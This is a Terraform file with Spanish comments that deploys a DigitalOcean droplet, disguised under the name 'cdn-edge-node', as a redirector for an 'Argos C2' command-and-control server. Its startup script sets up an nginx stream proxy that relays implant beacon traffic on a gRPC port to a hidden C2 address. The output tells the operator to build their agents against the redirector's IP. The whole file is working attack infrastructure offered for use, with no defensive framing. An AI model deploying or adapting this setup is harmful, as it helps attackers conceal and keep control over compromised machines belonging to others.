terraform {
  required_providers {
    digitalocean = {
      source  = "digitalocean/digitalocean"
      version = "~> 2.0"
    }
  }
}

variable "do_token" {
  description = "DigitalOcean API Token"
  type        = string
  sensitive   = true
}

variable "c2_server_ip" {
  description = "La IP real de tu servidor Argos C2 oculto"
  type        = string
}

variable "c2_grpc_port" {
  description = "El puerto gRPC de tu servidor Argos C2"
  type        = number
  default     = 50051
}

provider "digitalocean" {
  token = var.do_token
}

resource "digitalocean_droplet" "argos_redirector" {
  image  = "ubuntu-22-04-x64"
  name   = "cdn-edge-node" # Nombre ofuscado
  region = "nyc1"
  size   = "s-1vcpu-1gb"

  user_data = <<-EOF
              #!/bin/bash
              apt-get update
              apt-get install -y nginx

              cat > /etc/nginx/nginx.conf <<'EONX'
              user www-data;
              worker_processes auto;
              pid /run/nginx.pid;

              events {
                  worker_connections 1024;
              }

              stream {
                  upstream c2_grpc {
                      server ${var.c2_server_ip}:${var.c2_grpc_port};
                  }

                  server {
                      listen ${var.c2_grpc_port};
                      proxy_pass c2_grpc;
                      
                      # Evitar timeout en conexiones persistentes de beacons
                      proxy_timeout 1d;
                  }
              }
              EONX

              systemctl enable nginx
              systemctl restart nginx
              EOF
}

output "redirector_ip" {
  description = "IP del escudo. Usa esta IP al compilar tus agentes."
  value       = digitalocean_droplet.argos_redirector.ipv4_address
}
